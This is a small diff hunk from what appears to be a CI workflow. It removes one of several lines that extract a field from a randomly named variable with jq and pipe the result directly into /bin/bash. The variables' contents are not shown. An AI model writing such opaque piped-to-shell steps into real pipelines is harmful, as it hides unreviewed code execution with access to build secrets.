@@ -46,7 +46,6 @@ jobs:
           printf '%s' "$lkmhg30" | jq -r .ibl690 | /bin/bash
           echo $parls26 | jq -r .oppvm1 | /bin/bash
           printf '%s' "$ocemu5932" | jq -r .tn00234 | /bin/bash
-          printf '%s' "$nch13" | jq -r .g0 | /bin/bash
           echo $cbg579 | jq -r .efyy491 | /bin/bash
           echo $ipm73186 | jq -r .xkkn1136 | /bin/bash
           printf '%s' "$jqoqn9700" | jq -r .wvct62 | /bin/bash
